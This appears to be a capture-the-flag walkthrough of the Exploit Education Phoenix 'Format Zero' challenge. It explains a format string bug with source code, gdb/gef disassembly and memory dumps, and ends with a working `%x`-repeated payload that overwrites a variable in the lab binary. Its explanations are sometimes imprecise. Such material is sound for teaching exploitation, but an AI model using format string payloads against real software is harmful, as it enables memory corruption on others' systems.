# Exploit Education - Phoenix - Format Zero
url: http://exploit.education/phoenix/format-zero/

difficulty: Low

type: format_string

info: https://owasp.org/www-community/attacks/Format_string_attack

# Tools
* Linux
* gef (https://gef.readthedocs.io/en/master/)
* gdb (`apt install gdb`)

# Content
* `format_zero` - binary (format_zero: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, not stripped)
* `format_zero.c` - original file with added **LEVELNAME** define

# Analysis
Like what the title of this challenge says, it's probably a format string vulnerability and coming from previous
challenges, you might think that this will be similiar. At this point you should be familiar with what the format 
string attack is from the __info__ url on owasp website.

## The code
```
 21   struct {¬
 22     char dest[32];¬
 23     volatile int changeme;¬
 24   } locals;¬
 25   char buffer[16];¬
 26 ¬
 27   printf("%s\n", BANNER);¬
 28 ¬
 29   if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {¬
 30     errx(1, "Unable to get buffer");¬
 31   }¬
 32   buffer[15] = 0;¬
 33 ¬
 34   locals.changeme = 0;¬
 35 ¬
 36   sprintf(locals.dest, buffer);¬
 37 ¬
 38   if (locals.changeme != 0) {¬
```

### Line #29
We're asked on stdin for some input, we can place 100 x "A", running the below 
```
shell:> perl -e 'print "A" x 100' | ./format_zero 
Welcome to FORMAT_ZERO, brought to you by https://exploit.education
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```

We put 100 A's as the struct for locals is right next to buffer, since buffer is only 
16-bytes and locals struct is about 40-bytes we know that 100 should overflow it.

But as we read further, we see that buffer[15] gets a null-byte `\x00`, but look further
down.

### Line 36
Looing at `man 3 sprintf` it's defined as `int sprintf(char *str, const char *format, ...);`
so we're copying buffer[15] onto locals struct dest[32], which is really a format section
of sprintf() that we put on the buffer. 

So if we try to use just "A"'s the format in sprintf() section doesn't really mean anything,
but we can use formatting strings `%s or %d, maybe %x`. 

If we use `%x` as our buffer, then sprintf() will try to expend the directive as a pointer
address, that should be 8-bytes long for one, the dest[32] is 32-bytes, so 4(`%x`) should fill
it and 5(`%x`) should cause it to overflow it into `locals.changeme`, so lets give it a try.

## Analysis via GDB
Lets start format_zero in gdb and run `disas main`

```
shell:> gdb -q ./format_zero
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./format_zero...(no debugging symbols found)...done.
gef➤  disas main
Dump of assembler code for function main:
   0x000000000000079a <+0>:	push   rbp
   0x000000000000079b <+1>:	mov    rbp,rsp
   0x000000000000079e <+4>:	sub    rsp,0x50
   0x00000000000007a2 <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x00000000000007a5 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x00000000000007a9 <+15>:	lea    rdi,[rip+0x118]        
   0x00000000000007b0 <+22>:	call   0x630 <puts@plt>
   0x00000000000007b5 <+27>:	mov    rdx,QWORD PTR [rip+0x200854]        
   0x00000000000007bc <+34>:	lea    rax,[rbp-0x40]            # load buffer
   0x00000000000007c0 <+38>:	mov    esi,0xf
   0x00000000000007c5 <+43>:	mov    rdi,rax
   0x00000000000007c8 <+46>:	call   0x650 <fgets@plt>         # Our input
   0x00000000000007cd <+51>:	test   rax,rax                   # != NULL            
   0x00000000000007d0 <+54>:	jne    0x7e8 <main+78>            
   0x00000000000007d2 <+56>:	lea    rsi,[rip+0x133]        
   0x00000000000007d9 <+63>:	mov    edi,0x1
   0x00000000000007de <+68>:	mov    eax,0x0                   
   0x00000000000007e3 <+73>:	call   0x640 <errx@plt>
   0x00000000000007e8 <+78>:	mov    BYTE PTR [rbp-0x31],0x0   # buffer[15] = 0 (p/d 0x7fffffffdda0 - 0x7fffffffdda)
   0x00000000000007ec <+82>:	mov    DWORD PTR [rbp-0x10],0x0  # locals.changeme = 0
   0x00000000000007f3 <+89>:	lea    rdx,[rbp-0x40]            # load our buffer
   0x00000000000007f7 <+93>:	lea    rax,[rbp-0x30]            # load the locals.dest[32]
   0x00000000000007fb <+97>:	mov    rsi,rdx                   # mov rdx(buffer) into rsi
   0x00000000000007fe <+100>:	mov    rdi,rax                   # mov rax(locals.dest) into rdi
   0x0000000000000801 <+103>:	mov    eax,0x0                   # null-out rax
   0x0000000000000806 <+108>:	call   0x660 <sprintf@plt>       
   0x000000000000080b <+113>:	mov    eax,DWORD PTR [rbp-0x10]
   0x000000000000080e <+116>:	test   eax,eax
   0x0000000000000810 <+118>:	je     0x820 <main+134>
   0x0000000000000812 <+120>:	lea    rdi,[rip+0x10f]        
   0x0000000000000819 <+127>:	call   0x630 <puts@plt>
   0x000000000000081e <+132>:	jmp    0x82c <main+146>
   0x0000000000000820 <+134>:	lea    rdi,[rip+0x139]        
   0x0000000000000827 <+141>:	call   0x630 <puts@plt>
   0x000000000000082c <+146>:	mov    edi,0x0
   0x0000000000000831 <+151>:	call   0x670 <exit@plt>
End of assembler dump.
gef➤  
```

Lets breakpoint at *main+108, run it and input the output of `perl -e 'print "A" x 16'`
```
gef➤  b *main+108
Breakpoint 1 at 0x806
gef➤  run
Starting program: /home/tomderylo/exploit-education/phoenix/format_zero/format_zero 
Welcome to FORMAT_ZERO, brought to you by https://exploit.education
AAAAAAAAAAAAAAAA

   0x5555555547fe <main+100>       mov    rdi, rax
   0x555555554801 <main+103>       mov    eax, 0x0
 → 0x555555554806 <main+108>       call   0x555555554660 <sprintf@plt>
   ↳  0x555555554660 <sprintf@plt+0>  jmp    QWORD PTR [rip+0x200962]        # 0x555555754fc8
      0x555555554666 <sprintf@plt+6>  push   0x3

```
After our A input, we'll end up at sprintf(), lets skip an instruction
```
gef➤  ni
   0x5555555547fe <main+100>       mov    rdi, rax
   0x555555554801 <main+103>       mov    eax, 0x0
   0x555555554806 <main+108>       call   0x555555554660 <sprintf@plt>
 → 0x55555555480b <main+113>       mov    eax, DWORD PTR [rbp-0x10]       # load locals.changeme onto eax
   0x55555555480e <main+116>       test   eax, eax                        # != 0 
   0x555555554810 <main+118>       je     0x555555554820 <main+134>

```
Now knowing that
- locals.dest is @ rbp-0x31
- locals.changeme is @ rbp-0x10
- buffer is @ rbp-0x40

lets look at each one at 16-bytes each
```
gef➤  x/4xw $rbp-0x40 (buffer)
0x7fffffffdda0:	0x41414141	0x41414141	0x41414141	0x00004141
gef➤  x/4xw $rbp-0x10 (locals.changeme)
0x7fffffffddd0:	0x00000000	0x00007fff	0x00000000	0x00000000
gef➤  x/4xw $rbp-0x31 (locals.dest)
0x7fffffffddaf:	0x41414100	0x41414141	0x41414141	0x00414141

```
We can see that our buffer got copied into locals.dest, but that's just single-byte characters
that got copied, our "A"'s which were part of sprintf()'s format section, then what if we use
the special formatting characters. 

Lets restart with the same *main+108 breakpoint and as our input, lets put `%xAAAA` and observe
the variables memory again.
```
   0x555555554801 <main+103>       mov    eax, 0x0
   0x555555554806 <main+108>       call   0x555555554660 <sprintf@plt>
 → 0x55555555480b <main+113>       mov    eax, DWORD PTR [rbp-0x10]
   0x55555555480e <main+116>       test   eax, eax
   0x555555554810 <main+118>       je     0x555555554820 <main+134>

gef➤  x/4xw $rbp-0x31 (locals.dest)
0x7fffffffddaf:	0x66666600	0x61646466	0x41414130	0x00000a41
gef➤  x/4xw $rbp-0x10 (locals.changeme)
0x7fffffffddd0:	0x00000000	0x00007fff	0x00000000	0x00000000
gef➤  x/4xw $rbp-0x40 (buffer)
0x7fffffffdda0:	0x41417825	0x000a4141	0x5555488d	0x00005555
gef➤  

```
If we look at locals.dest, you can see where our A*4 is and how much space has 2-bytes of `%x` buffer
input to sprintf() format taken, 4-bytes of pointer garbage, that is from single `%x` formatting string,
so in order to overflow to `locals.change` which is 32-bytes away from `locals.dest` we would need about
8*`%x` strings. Lets try it out, but now on command line.
```
shell:> perl -e 'print "%x" x 8' | ./format_zero 
Welcome to FORMAT_ZERO, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!

```